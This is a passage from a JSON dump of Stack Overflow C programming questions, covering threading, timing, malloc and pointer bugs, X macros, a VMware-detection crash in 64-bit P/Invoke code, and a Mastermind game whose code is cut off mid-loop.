C","body":"<p>As a part of my project I have to modify a Numerical Integration Algorithm using threads. </p>\n\n<p>This is roughly what happens in the conventional sequential approach..</p>\n\n<pre><code>void Controller(struct DE)\n{\n    //initialization step\n    for(;;)   //till the entire range has not been covered...\n    {\n         //compute the next time-point solution using the previously known solutions.\n         NIiter();\n         //then check if the result is acceptable or not and take the necessary steps...\n    }\n}\n</code></pre>\n\n<p>Now this is what I intend to do....</p>\n\n<pre><code>void Controller(struct DE)\n{\n    //initialization step\n    for(;;)   //till the entire range has been covered...\n    {\n         //compute the next time using the previously known solution.\n         NIiter();\n         //when I have an approximate solution available..launch a thread to compute the next time-point using this approximate solution as a previous solution...something like forward pipelining...\n         //then check if BOTH the results are acceptable or not and take the necessary steps...\n    }\n}\n</code></pre>\n\n<p>But I dont understand how to notify my controller that the an approximate solution is available...so it can launch a new thread...</p>\n\n<p>This is my first exposure to multi-threaded programming...so forgive me if this seems to be an obvious question..also I am using Pthread library in my project...</p>\n"},{"tags":["c","time","matrix","multiplying"],"answer_count":4,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":117,"score":6,"question_id":13156031,"title":"Measuring time in C","body":"<p>I'm trying to measure some activity in C (Matrix multiplying) and noticed that I should do something like this:</p>\n\n<pre><code>clock_t start = clock();\nsleep(3);\nclock_t end = clock();\ndouble elapsed_time = (end - start)/(double)CLOCKS_PER_SEC;\nprintf(\"Elapsed time: %.2f.\\n\", elapsed_time);\n</code></pre>\n\n<p>The output is:</p>\n\n<pre><code>Elapsed time: 0.00.\n</code></pre>\n\n<p>Why is this happening?</p>\n"},{"tags":["c","sockets"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13217726,"title":"Can a single socket be used for full duplex communication in C?","body":"<p>I am writing a peer-to-peer application where the connection between the two client peers must be duplex, so that both clients are capable of transmitting and receiving at the same time. Is it possible with a single socket or do I need to use two sockets?</p>\n"},{"tags":["c++","c","matplotlib"],"answer_count":4,"favorite_count":5,"up_vote_count":9,"down_vote_count":1,"view_count":3622,"score":8,"question_id":2509156,"title":"Anyone knows a matplotlib equivalent in C or C++","body":"<p>I've been using matplotlib in a Python project. It is great.</p>\n\n<p>I have now to plot data in a C++ project. Is anyone aware of a plotting library in C or C++?</p>\n\n<p>Note that I cannot accept GPL licensed libraries.</p>\n"},{"tags":["c","trim","readfile"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":13217278,"title":"read a file and remove characters using C","body":"<p>I am struggling with read a file and remove some characters in the line, I can remove characters any how, but the char * contain so many unknown things. </p>\n\n<p>this is inside of my file. just a one line</p>\n\n<pre><code>localpath=/home/ubu/myDocs\n</code></pre>\n\n<p>in my code</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;strings.h&gt;\n\nchar *path;\n\nint main()\n{ \n  static const char filename[] = \"pathFile\";\n  FILE *file = fopen ( filename, \"r\" );\n\n   if ( file != NULL )\n   {\n      char line[512];\n      while ( fgets ( line, sizeof line, file ) != NULL ) // read a line \n      {\n         fputs ( line, stdout ); // write the line \n         path = strchr(line,'=') +1 ;\n      }\n      fclose ( file );\n   }\n   else\n   {\n      perror ( filename ); // why didn't the file open? \n   }\n}\n</code></pre>\n\n<p>but the problem is I can't use path, as example chdir(path); is not working,\nbut if I use like this strcpy(path,\"/home/ubu/myDocs\"); I can use it,</p>\n\n<p>So get am idea I print the char like this</p>\n\n<p>for (i=0, i &lt; 200; i++)\nprintf(path[i]);</p>\n\n<p>in the first case I got some weird character after the(\"/home/ubu/myDocs\") in output, but in the second case I didn't get that kind of things and it works well. I can't understand what to do, I followed so many methods in internet, but same thing happen, Please  explain me what happen and give me some solution</p>\n\n<p>p.s\nI found that in first case chdir return value is &lt; 0, that mean path is wrong no,,,but it consists path and something useless thing</p>\n\n<p>thanks</p>\n"},{"tags":["c","linked-list","generic-list"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":13213995,"title":"Conversion from double to pointer","body":"<p>I'm quite newbie in C and now I'm trying to implement basic generic linked list with 3 elements, each element will contain a different datatype value — int, char and double.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct node\n{\n    void* data;\n    struct node* next;\n};\n\nstruct node* BuildOneTwoThree()\n{\n    struct node* head   = NULL;\n    struct node* second = NULL;\n    struct node* third  = NULL;\n\n    head    = (struct node*)malloc(sizeof(struct node));\n    second  = (struct node*)malloc(sizeof(struct node));\n    third   = (struct node*)malloc(sizeof(struct node));\n\n    head-&gt;data = (int*)malloc(sizeof(int));\n    (int*)(head-&gt;data) = 2;\n    head-&gt;next = second;\n\n    second-&gt;data = (char*)malloc(sizeof(char));\n    (char*)second-&gt;data = 'b';\n    second-&gt;next = third;\n\n    third-&gt;data = (double*)malloc(sizeof(double));\n    (double*)third-&gt;data = 5.6;\n    third-&gt;next = NULL;\n\n    return head;\n}\n\nint main(void)\n{\n    struct node* lst = BuildOneTwoThree();\n\n    printf(\"%d\\n\", lst-&gt;data);\n    printf(\"%c\\n\", lst-&gt;next-&gt;data);\n    printf(\"%.2f\\n\", lst-&gt;next-&gt;next-&gt;data);\n\n    return 0;\n}\n</code></pre>\n\n<p>I have no problem with the first two elements, but when I try to assign a value of type double to the third element I get an error: «<strong>cannot convert from 'double' to 'double *'</strong>».</p>\n\n<p>What is the reason for this error? Why don't I get the same error in case of <code>int</code> or <code>char</code>?\nAnd the most important question: how to fix this, how to assign a <code>double</code> value to the data field of the third element?</p>\n\n<p>The problem string is «<strong>(double*)third->data = 5.6;</strong>».</p>\n\n<p>Thanks.</p>\n"},{"tags":["c","embedded","portability","freertos"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":58,"score":3,"question_id":13217134,"title":"How do I keep code portable while using FreeRTOS","body":"<p>I am hung up on how to move forward with FreeRTOS in my application. Let me propose a simple scenario. Assume I have main and a module which has some hardware specific code. This code could be for controlling a specific motor in a system or a sensor... any bit of hardware with a defined role. Within module.c I have a function called <code>ModuleNameTask</code>. In <code>main</code> I create the task using <code>xTaskCreate</code> and I pass <code>ModuleNameTask</code>. Since my <code>ModuleNameTask</code> is defined in module.c and not main.c, I now have to include bits of FreeRTOS within module.c in order to use functions like <code>vTaskDelay</code>. I don't like the fact that I am including these files within module.c as I feel its no longer portable.</p>\n\n<p>So, how do I handle this? Should I remove that <code>ModuleNameTask</code> from module.c and place it in main.c? Or just accept the fact that I have to include bits of FreeRTOS into module.c. Any advice?</p>\n"},{"tags":["c","arrays","arduino"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":196,"score":1,"question_id":11295728,"title":"Convert bytes in a C array as longs","body":"<p>I have a byte array in little endian byte order. How do I convert it to a long (four bytes) array?</p>\n\n<p>In layman's terms, I want to merge every four bytes.</p>\n"},{"tags":["c","arrays","type-conversion","arduino"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":153,"score":2,"question_id":13176195,"title":"Converting a byte array to an int array in C","body":"<p>I have some code below that is supposed to be converting a <a href=\"http://en.wikipedia.org/wiki/C_%28programming_language%29\" rel=\"nofollow\">C</a> (Arduino) 8-bit byte array to a 16-bit int array, but it only seems to partially work. I'm not sure what I'm doing wrong.</p>\n\n<p>The byte array is in little endian byte order. How do I convert it to an int (two bytes per enty) array?</p>\n\n<p>In layman's terms, I want to merge every two bytes.</p>\n\n<p>Currently it is outputting for an input BYTE ARRAY of: <code>{0x10, 0x00, 0x00, 0x00, 0x30, 0x00}</code>. The output INT ARRAY is: <code>{1,0,0}</code>. The output should be an INT ARRAY is: <code>{1,0,3}</code>.</p>\n\n<p>The code below is what I currently have:</p>\n\n<p>I wrote this function based on <a href=\"http://stackoverflow.com/questions/11295728/convert-bytes-in-a-c-array-as-longs/11295756#11295756\">a solution in Stack Overflow question <em>Convert bytes in a C array as longs</em></a>.</p>\n\n<p>I also have this solution based off the same code which works fine for byte array to long (32-bits) array <code>http://pastebin.com/TQzyTU2j</code>.</p>\n\n<pre><code>/**\n* Convert the retrieved bytes into a set of 16 bit ints\n**/\nint * byteA2IntA(byte * byte_slice, int sizeOfB, int * ret_array){\n\n    //Variable that stores the addressed int to be stored in SRAM\n    int currentInt;\n    int sizeOfI = sizeOfB / 2;\n\n    if(sizeOfB % 2 != 0) ++sizeOfI;\n        for(int i = 0; i &lt; sizeOfB; i+=2){\n            currentInt = 0;\n            if(byte_slice[i]=='\\0') {\n                break;\n            }\n            if(i + 1 &lt; sizeOfB)\n                currentInt = (currentInt &lt;&lt; 8) + byte_slice[i+1];\n            currentInt = (currentInt &lt;&lt; 8) + byte_slice[i+0];\n            *ret_array = currentInt;\n            ret_array++;\n        }\n        //Pointer to the return array in the parent scope.\n        return ret_array;\n    }\n</code></pre>\n"},{"tags":["c","function"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":13215864,"title":"Can't get a function call in a function to work properly","body":"<p>I'm writing a program to generate a string of random uppercase letters, then take user input of uppercase letters, along with a character form the user. For any instance of the user input letter in the random string, it replaces that letter with the character entered by the user.</p>\n\n<p>For example, s1 = {BDHFKYL} s2 = {YEIGH} c = '*'</p>\n\n<p>Output = BD*FK*L</p>\n\n<p>The program was working correctly until I added the feature to ask the user to enter what character they would like to replace the letters. </p>\n\n<p>The output is: </p>\n\n<pre><code>Please enter at least 2 capital letters and a maximum of 20.\nHDJSHDSHDDS\nHDJSHDSHDDS\nEnter a character to replace occuring letters.\n*\nNWLRBBMQB\nWould you like to enter another string?\n</code></pre>\n\n<p>Here's the code: </p>\n\n<pre><code>void fillS1(char x[]);\n\nvoid fillS2(char x[], char y[], char z);\n\nvoid strFilter(char a[], char b[], char c);\n\nint main(int argc, const char * argv[])\n{\n char s1[42];\n char s2[22];\n char x = 0;\n\n fillS2(s2, s1, x);\n\n return 0;\n}\n\nvoid fillS1(char x[])\n{\n for (int i = 0; i &lt; 40; i++)\n     x[i] = 'A' + random() % 26;\n x[40] = (char)0;\n}\n\nvoid fillS2(char x[], char y[], char z){\n\n char loopContinue = 0;\n\n do {\n\n int i = 0;\n int capitalLetterCheck = 0;\n\n printf(\"Please enter at least 2 capital letters and a maximum of 20.\\n\");\n while (( x[i] = getchar()) != '\\n' ) {\n\n    i++;\n\n     }\n\n x[i] = '\\0';\n\n if (i &lt; 3) {\n    printf(\"You need at least two letters\\n\");\n }\n\n else if (i &gt; 21){\n    printf(\"You cannot have more than twenty letters\\n\");\n}\n\n\nfor (i = 0; i &lt; 20; i++) {\n        if ((x[i] &gt;= 'a') &amp;&amp; (x[i] &lt;= 'z')) {\n            printf(\"You many only have capital letters.\\n\");\n            capitalLetterCheck = 2;\n        }\n    }\n\n\nif (capitalLetterCheck != 2) {\n    for (i = 0; i &lt; 20; i++) {\n        if ((x[i] &gt;= 'A') &amp;&amp; (x[i] &lt;= 'Z')) {\n            puts(x);\n\n            fillS1(y);\n\n            printf(\"Enter a character to replace occuring letters.\\n\");\n            while ((z = getchar() != '\\n')) {\n\n            }\n\n            strFilter(y, x, z);  \n            break;\n        }\n        }\n    }\n\n    printf(\"Would you like to enter another string?\\n\");\n    gets(&amp;loopContinue);\n\n} while (loopContinue != 'n');\n\n}\n\nvoid strFilter(char a[], char b[], char c){\n int i = 0;\n int n = 0;\n\n while (n &lt; 20) {\n\n        for (i = 0; i &lt; 40; i++) {\n            if (a[i] == b[n]){\n                a[i] = c;\n            }\n\n    }\n    i = 0;\n    n++;\n}\n\n   puts(a);\n}\n</code></pre>\n\n<p>Thank you.</p>\n"},{"tags":["c","gcc","concurrent-programming","memory-barriers"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13216808,"title":"What is the light(est) weight GCC memory barrier in such case?","body":"<p>I have the following C code:</p>\n\n<pre><code>...\ndata[index] = something;\na_write_memory_barrier();\nindex = new_index;\n...\n</code></pre>\n\n<p>The code is not protected by a lock(others just read <code>data</code> and <code>index</code>), I want to make sure <code>data[index]</code> is stored before the updating of <code>index</code>.  There are memory writes and reads of other variables around this code, but they do not matter, so GCC can freely reorder them(and I hope it does so for optimization). Just guarantee the order of <code>data[index]</code> and <code>index</code> is enough. How should <code>a_write_memory_barrier()</code> be implemented to achieve this goal? </p>\n"},{"tags":["c","linux","redhat","coredump"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":24,"score":-1,"question_id":13216665,"title":"coredump file permissions","body":"<p><br/> \nIm using redhat 6.0 , whenever a coredump file is created I want that file permission to be 700 <br/>\nit would be a great help if u tell me the configuration file as well as sample configuration <br/> \nthis time google is not helping me properly <br/></p>\n"},{"tags":["c","pointers","copy","char","corruption"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13216518,"title":"Copying Array of Char * Corrupts Data","body":"<p>I'm relatively new to C in general and I'm having a problem with some code. It's pretty simple code: The objective of the code is to copy a given array of char pointers, or char **source, in other words, to a given char **destination.</p>\n\n<p>The issue I'm having is that sometimes (usually when I have more than 2 strings in source) the first element gets completely corrupted and when I end up printing out destination, it will print out something like \";@?\" for the first element, with the other elements printing fine.</p>\n\n<p>The code that performs the copying is:</p>\n\n<pre><code>void CopyArrayOfStrings(char **source, int numStrings)\n{\n   char **destination = malloc(numStrings);\n\n    for (int i = 0; i &lt; numStrings; i++)\n    {\n        destination[i] = malloc(strlen(source[i] + 1);\n        strcpy(destination[i], source[i]);\n    }\n}\n</code></pre>\n\n<p>Note that I left out the code that checks if the result of malloc is NULL.</p>\n"},{"tags":["c","unix","ubuntu","wait"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":62,"score":0,"question_id":13216554,"title":"What does wait() do on Unix?","body":"<p>I was reading about the <code>wait()</code> function in a Unix systems book. The book contains a program which has <code>wait(NULL)</code> in it. I don't understand what that means. In other program there was</p>\n\n<pre><code>while(wait(NULL)&gt;0) \n</code></pre>\n\n<p>...which also made me scratch my head.</p>\n\n<p>Can anybody explain what the function above is doing?</p>\n"},{"tags":["c","macros","c-preprocessor"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":36,"score":2,"question_id":13216423,"title":"error: pasting \".\" and \"red\" does not give a valid preprocessing token","body":"<p>I'm implementing The X macro, but I have a problem with a simple macro expansion. This macro (see below) is used into several macros usage examples, by including in <a href=\"http://www.cprogramming.com/tutorial/cpreprocessor.html\" rel=\"nofollow\"><code>this</code></a> article.\n The compiler gives an error message, but I can see valid C code by using <code>-E</code> flag with the GCC compiler.</p>\n\n<p>The macro X-list is defined as the following:</p>\n\n<pre><code>#define LIST \\\n  X(red, \"red\") \\\n  X(blue, \"blue\") \\\n  X(yellow, \"yellow\")\n</code></pre>\n\n<p>And then:</p>\n\n<pre><code>#define X(a, b) foo.##a = -1;\n  LIST;\n#undef X\n</code></pre>\n\n<p>But the gcc given the following errors messages:</p>\n\n<pre><code>lixo.c:42:1: error: pasting \".\" and \"red\" does not give a valid preprocessing token\nlixo.c:42:1: error: pasting \".\" and \"blue\" does not give a valid preprocessing token\nlixo.c:42:1: error: pasting \".\" and \"yellow\" does not give a valid preprocessing token\n</code></pre>\n\n<p>Like I said, I can seen valid C code by using <code>-E</code> switch on gcc:</p>\n\n<pre><code>lixo.c:42:1: error: pasting \".\" and \"red\" does not give a valid preprocessing token\nlixo.c:42:1: error: pasting \".\" and \"blue\" does not give a valid preprocessing token\nlixo.c:42:1: error: pasting \".\" and \"yellow\" does not give a valid preprocessing token\n  foo.red = -1; foo.blue = -1; foo.yellow = -1;;\n</code></pre>\n\n<p>What's a valid preprocessing token? Can someone explain this?</p>\n\n<p>(before you say \"why not just an either initialize or <code>memset()</code>?\" it's not my real code.)</p>\n"},{"tags":["c","arrays"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13216309,"title":"Printing 2D arrays prints junk(Magic Square)","body":"<p>I am trying to write a C program to print a magic square. However, I am encountering an error when building the square. Could anyone help to figure out what is causing these bugs? The following is my relevant code, and my output:</p>\n\n<p>Code:</p>\n\n<pre><code>  int main(void) {\n      int size = 0;\n      int r, c;\n      int i = 1;\n\n      printf(\"What is the size of the square: \");\n      scanf(\"%d\", &amp;size);\n\n      int square[size][size];\n      int range = size * size;\n      r = 0;\n      c = size/2;\n\n      do {\n          square[r][c] = i;\n\n          i++;\n          r--;\n          c++;\n\n          if ((r == -1) &amp;&amp; (c == size)) {\n              r = r + 2;\n              c--;\n          } else if (r == -1) {\n              r = size - 1;\n          } else if (c == size) {\n              c = 0;\n          } else if (square[r][c] != 0) {\n              r = r + 2;\n              c--;\n          }\n      } while (i &lt; range);\n\n      for (r = 0; r &lt; size; r++) {\n          for (c = 0; c &lt; size; c++) {\n              printf(\"%d \\t\", square[r][c]);\n          }\n          printf(\"\\n\");\n      }\n\n      return 0;\n  }\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>What is the size of the square: 3\n-4196312        1       0\n3       -4196352        -13339222\n4       -13360148       2\n</code></pre>\n"},{"tags":["c#","c","visual-studio-2008","exception","assembly"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13216421,"title":"64-bit VMWare detection code triggers breakpoint","body":"<p>I'm doing VMWare detection in a .NET 2.0 C# console project. The detection code is implemented in C as an exported function in a DLL that's called from the C# code using P/Invoke. The C# code is compiled as x86 and as x64 into two separate executables. The C DLL is also compiled for both platforms. Here's the exported function:</p>\n\n<pre><code>PUBLIC Int32 __declspec(nothrow) WINAPI GetVMType ()\n{\n    Int32 nVMWareType = 0;\n\n    try\n    {\n        if ( !IsInVMWare ( nVMWareType ) )\n        {\n            ... // allocate memory, write data, etc.\n        }\n    }\n    catch ( ... )\n    {\n        nVMWareType = -1;\n    }\n\n    return ( nVMWareType );\n} // &lt;-- breakpoint happens here\n</code></pre>\n\n<p>I have the following code using inline assembly for VMWare detection:</p>\n\n<pre><code>PRIVATE Bool IsInVMWare ( Int32&amp; nType )\n{\n    Bool bResult = false;\n    Int32 nVersion = -1;\n    nType = -1;\n\n    __try\n    {\n        #ifndef _WIN64 // 32-bit detection\n        __asm\n        {\n            push    edx\n            push    ecx\n            push    ebx\n\n            mov     eax, 'VMXh'\n            mov     ebx, 0          // anything but 'VMXh'\n            mov     ecx, 10         // get VMWare version\n            mov     edx, 'VX'       // port number\n            in      eax, dx         // read port\n            cmp     ebx, 'VMXh'     // is it a reply from VMWare?\n            je      lblInVMWare\n\n            xor     ecx, ecx        // not in VMWare - clear return value\n\n        lblInVMWare:\n            mov     [nVersion], ecx // vmware product type\n            pop     ebx\n            pop     ecx\n            pop     edx\n        }\n        #else\n        nVersion = GetVMWareVersion (); // 64-bit detection\n        #endif\n\n        nType = nVersion;\n\n        if ( nType &gt; 0 )\n            bResult = true;\n    }\n    __except ( EXCEPTION_EXECUTE_HANDLER )\n    {\n        bResult = false;\n    }\n\n    return ( bResult );\n}\n</code></pre>\n\n<p>The 64-bit detection code is implemented as <code>GetVMWareVersion()</code> in assembly:</p>\n\n<pre><code>PUBLIC GetVMWareVersion\n    .CODE\n    ALIGN   8\n\nGetVMWareVersion PROC\n\n    push    rbp\n    mov     rbp, rsp\n\n    push    rdx\n    push    rcx\n    push    rbx\n\n    mov     rax, 'VMXh'\n    mov     rbx, 0       ; anything but 'VMXh'\n    mov     rcx, 10      ; get VMWare version\n    mov     rdx, 'VX'    ; port number\n    in      rax, dx      ; read port\n    cmp     ebx, 'VMXh'  ; is it a reply from VMWare?\n    je      $0@GetVMWareVersion\n\n    xor     rax, rax     ; not in VMWare - clear return value\n    jmp     $1@GetVMWareVersion\n\n$0@GetVMWareVersion:\n    mov     rax, rcx     ; VMWare product type\n\n$1@GetVMWareVersion:\n    pop     rbx\n    pop     rcx\n    pop     rdx\n\n    mov     rsp, rbp\n    pop     rbp\n    ret\n\nGetVMWareVersion ENDP\n\nEND\n</code></pre>\n\n<p>The 32-bit detection code runs fine on a non-VM Windows 7. When the 64-bit version runs (same environment), it triggers a <code>DebugBreak()</code> call with the following call stack:</p>\n\n<pre><code>KernelBase.dll!DebugBreak() + 0x2 bytes\n[Frames below may be incorrect and/or missing, no symbols loaded for KernelBase.dll]\nmscorwks.dll!PreBindAssembly() + 0x9ce69 bytes\nmscorwks.dll!PreBindAssembly() + 0x9d28e bytes\nmscorwks.dll!CreateApplicationContext() + 0x769d bytes\nmscorwks.dll!StrongNameTokenFromPublicKey() + 0x64f8 bytes\nmscorwks.dll!StrongNameTokenFromPublicKey() + 0x66ff bytes\nmscorwks.dll!CreateApplicationContext() + 0x7f62 bytes\nntdll.dll!vsprintf_s() + 0x12b bytes\nntdll.dll!RtlUnwindEx() + 0x852 bytes\nntdll.dll!KiUserExceptionDispatcher() + 0x2e bytes\nmscorwks.dll!IEE() + 0xd285 bytes\ncccccccccccccccc()\n0000000000d78180()\ncccccccccccccccc()\n</code></pre>\n\n<p>I also have this in the Output window when I debug the C DLL in Visual Studio:</p>\n\n<pre><code>First-chance exception at 0x000007feedbdfad1 (mscorwks.dll) in MyApp.exe:\n    0xC0000005: Access violation reading location 0xffffffffffffffff.\n</code></pre>\n\n<p>Every once in a while (not always) I also get this in the Event Log:</p>\n\n<pre><code>.NET Runtime version 2.0.50727.5456 - Fatal Execution Engine Error\n    (000007FEEDB27916) (80131506)\n</code></pre>\n\n<p>I'm at a total loss as to why this happens. I did a lot of searching but I couldn't find anything that would seem to apply to this problem. Some sites suggest to switch to .NET 4.0 but that's not an option.</p>\n\n<p>I analyzed all the code in <code>GetVMType ()</code> - it does some memory allocation and writes data into dynamically allocated arrays but that code is correct: all memory is released and no memory is overwritten incorrectly.</p>\n\n<p>If I modify the 64-bit assembly code to skip the <code>in</code> instruction, the breakpoint is not triggered. This is not an issue when running as 32-bit code.</p>\n\n<p>The calling C# program has a top-level exception handler and an event handler for <code>UnhandledException</code> event but when this problem happens, the application just quits - none of the handlers are called.</p>\n\n<p>Does anyone have any idea what could be wrong with this setup? I spent hours of debugging and trying to see what's happening but it seems something inside .NET breaks when the P/Invoke call returns after that <code>in</code> instruction executes.</p>\n"},{"tags":["c","pointers","malloc"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13208439,"title":"Passing pointers to a function causes reading unaccessible address in C","body":"<p>I have a program and in there, I dynamically allocate memory by using malloc; here is the important part: </p>\n\n<pre><code>unsigned int *hours;\nunsigned int *minutes;\nhours = (unsigned int *) malloc(n * sizeof(*hours));\nminutes = (unsigned int *) malloc(n * sizeof(*minutes));\n</code></pre>\n\n<p>After this, I have a for loop, that loops n times; each time it reads time and stores hours at hours[i] and minutes at minutes[i];  <code>for (i = 0; i &lt; n; i++)</code></p>\n\n<p>I read n before allocation using :</p>\n\n<pre><code>scanf(%d, &amp;n);\n</code></pre>\n\n<p>Next, I have function, that takes 3 parameters, it looks like this:</p>\n\n<pre><code>void convertToMinutes(unsigned int *hours[],unsigned int *minutes[],int n)\n{\n     unsigned int i;\n     for (i = 0; i &lt; n; i++)\n     {\n         *minutes[i] =*hours[i]*60 + *minutes[i];\n     }\n}\n</code></pre>\n\n<p>This is part that causes program to crash. I'm using Dr. Memory to see what happens, here is dump:</p>\n\n<pre><code>Error #1: UNADDRESSABLE ACCESS: reading 0x00000005-0x00000009 4 byte(s)\n# 0 convertToMinutes    \n# 1 main                \nNote: @0:00:11.408 in thread 1740\nNote: instruction: mov    (%eax) -&gt; %ecx\n</code></pre>\n\n<p>As you can see, it tries to read address at 0x00000005, which causes Windows to shut it down.</p>\n\n<p>So before calling this function, I looked at addresses of hours and minutes arrays and here is what I found:</p>\n\n<pre><code>for n = 3\nhours base 10948584\nhours+1    10948588\nhours+2    19848592\nminutes base 10948608\nminutes+1    10948612\nminutes+2    10948616\n</code></pre>\n\n<p>(Addresses are converted to int)</p>\n\n<p>I'm lost. I have no idea what is wrong. Pointers are new to me (I've been using them for few days) and I have no idea why it suddenly tries to read at forbidden address.  What am I doing wrong?</p>\n"},{"tags":["c","malloc"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":108,"score":3,"question_id":13216142,"title":"Malloc implementation with C","body":"<p>I am trying to implement Malloc manually in a C project.\nHere is my code:</p>\n\n<pre><code>void *Mem_Alloc(int size) {\n    struct Node *p, *prevp = head;\n\n    if (fitPolicy == P_BESTFIT) {\n\n    }\n\n    if (fitPolicy == P_FIRSTFIT) {\n        for (p = prevp-&gt;next; ;prevp = p, p = p-&gt;next) {\n            if (p-&gt;size &gt;= size) {\n                if (p-&gt;size == size)\n                    prevp-&gt;next = p-&gt;next;\n                else {\n                    p-&gt;size -= size;\n                    p += p-&gt;size;\n                    // p-&gt;size = size;\n                }\n                head = prevp;\n                return (void *)(p+1);\n            }\n            if (p == head) {\n                return NULL;\n            }\n        }\n    }\n\n    if (fitPolicy == P_WORSTFIT) {\n\n    }\n    return NULL;\n}\n</code></pre>\n\n<p>Basically, I call <code>mmap</code> in another method called <code>Mem_Init</code>; then, the returned memory map is pointed to by the variable <code>head</code>.\nI always get a segmentation fault on the commented part in the middle of <code>Mem_Alloc</code>. I do not know why. Could you guys help me with this? Some hints?</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13211969,"title":"Calling recursive function twice consecutively","body":"<pre><code>#include &lt;stdio.h&gt;\n\n#define LENGTH 16\n\nvoid makeBranches(int, int);\nvoid display(int, int);\n\nint main(){\n\n  makeBranches(0, LENGTH-1);\n}\n\nvoid makeBranches(int left, int right){\n\n  if(left &gt;= right){\n    return;\n  } else{\n    display(left, right);\n    makeBranches(left, (right+left)/2);\n    makeBranches((right+left/2)+1, right);\n  }\n}\n\nvoid display(int left, int right){\n  printf(\"%d, %d\", left, right);\n  int mid = (left+right)/2;\n  int i;\n\n  for(i = left; i &lt;= right; i++){\n    if(i == mid)\n      printf(\"X\");\n    else\n      printf(\"-\");\n  }\n\n  if(right == LENGTH-1)\n    printf(\"\\n\");\n\n}\n</code></pre>\n\n<p>The problem that I am having is the second call of makeBranches only executes with the values that caused the first call of makeBranches to return and not the original values that the first call used.</p>\n"},{"tags":["c","string","compare","pattern-matching"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":138,"score":0,"question_id":13206078,"title":"Comparison of strings for Mastermind game","body":"<p>I am writing a program that simulates the game Mastermind, but I am struggling with how to compare guessed pattern to key pattern.\nThe game conditions are a little bit changed:  </p>\n\n<ul>\n<li>patterns consist of letters.  </li>\n<li>if an element of guessed pattern is equal to element of key pattern, and also index is equal, then print b.  </li>\n<li>if an element of guessed pattern is equal to element of key pattern, but index is not, then print w.  </li>\n<li>if an element of guessed pattern is not equal to element of key pattern, print dot.  </li>\n<li>in feedback about guessed pattern, 'b's come first, 'w's second, '.'s last.  </li>\n</ul>\n\n<h3>Original key vs guess pattern match code</h3>\n\n<pre><code>    for (i=0; i&lt;patternlength; i++)\n    {\n        for (x=0; x&lt;patternlength; x++)\n        {\n           if (guess[i]==key[x] &amp;&amp; i==x)\n                printf(\"b\");\n            if (guess[i]==key[x] &amp;&amp; i!=x)\n                printf(\"w\");\n            if (guess[i]!=key[x])\n                printf(\".\");\n        }   \n    }\n</code></pre>\n\n<h3>Revised code</h3>\n\n<p>This is using some of the answer provided by <a href=\"http://stackoverflow.com/users/15168/jonathan-leffler\">Jonathan Leffler</a>.  Unfotunately, it isn't working correctly yet; can you help me?</p>\n\n<p>The functions length() and guessnum() are defined already.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\nint length()\n{\n  int length;\n  printf(\"Enter the pattern length: \");\n  scanf(\"%d\", &amp;length);\n  return length;\n}\nint guessnum()\n{\n  int guessnum;\n  printf(\"Enter the number of guesses: \");\n  scanf(\"%d\", &amp;guessnum);\n  return guessnum;\n}\nint main(void)\n{\n  int patternlength = length();\n  char key[patternlength+1];      \n  char keyc[patternlength+1];    \n  int numguess = guessnum();\n  char guess[patternlength+1];    \n  printf(\"Input the key pattern with no spaces: \");\n  scanf(\"%s\", key);\n  int i,j,count = 1;\n  int bcount = 0, wcount = 0;\n  char guessc[patternlength+1];\n  guessc[0] = '\\0';            \n  int ind;\n  char output[patternlength];\n  for (ind=0; ind&lt;(patternlength+1); ind++)\n    output[ind]='\\0';\n  char outputc[patternlength+1];\n  char guessold[patternlength+1];\n  for (ind=0; ind&lt;(patternlength+1); ind++)\n  guessold[ind]='\\0';\n  while (strcmp(key, guess) !=0 &amp;&amp; count&lt;=numguess)\n    {\n      if(count&gt;1)\n    strcpy(guessold, guess);\n      strcpy(keyc, key);          \n      printf(\"Input a guess pattern with no spaces: \");\n      scanf(\"%s\", guess);\n      if (count&gt;1)\n    printf(\"%d: %s %s\\n\", count-1, output, guessold);\n      strcpy(guessc, guess);\n      wcount = 0;    \n      bcount = 0;     \n      printf(\"%d: \", count);\n      for (i = 0; i &lt; patternlength; i++)\n    {\n      if (keyc[i] == guessc[i])\n        {\n          putchar('b');\n          keyc[i] = guessc[i] = '.';\n          bcount++;\n          for (ind=0; ind&lt;patternlength; ind++)\n        output[ind]='b';\n        }\n    }\n      if (bcount != patternlength)\n    {\n      for (i = 0; i &lt; patternlength; i++)\n        {\n          if (guessc[i] != '.')\n        {\n\n          for (j = 0; j &lt; patternlength; j++)\n            {\n\n              if (guessc[i] 